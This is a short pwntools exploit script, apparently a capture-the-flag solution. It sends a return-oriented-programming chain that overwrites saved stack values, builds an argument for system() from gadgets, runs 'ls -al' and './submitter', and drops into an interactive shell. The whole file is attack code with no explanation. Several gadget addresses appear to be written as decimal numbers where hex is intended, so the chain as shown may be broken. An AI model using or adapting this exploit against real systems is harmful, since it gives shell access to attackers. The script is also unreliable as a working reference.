#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def set_value(value: int):
    io.sendlineafter(b"Addr pls: ", str(value).encode())


value_list = [
    42,  # stack[0]
    42,  # stack[1]
    42,  # stack[2]
    3_0000_0000,  # i
    42,  # saved rbp
    402218, #pop rdi ; pop rbp ; ret
    400900,
    401917,  # for rbx, 0000000000401917 call    system
    426497, #rol bl, 1 ; mov rax, rdi ; ret
    402218, #pop rdi ; pop rbp ; ret
    490499,
    42,
    402216, #pop rsi ; pop r15 ; pop rbp ; ret
    10000,
    42,
    42,
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    402216, #pop rsi ; pop r15 ; pop rbp ; ret
    10,
    42,
    42,
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    493943, #add edi, esi ; add eax, dword ptr [rax] ; ret
    401917,
    # 401840,  # 0x0000000000401840 : ret
    0,
]

for value in value_list:
    set_value(value)

io.sendline(b'ls -al')
io.sendline(b'./submitter')
io.interactive()

io.interactive()
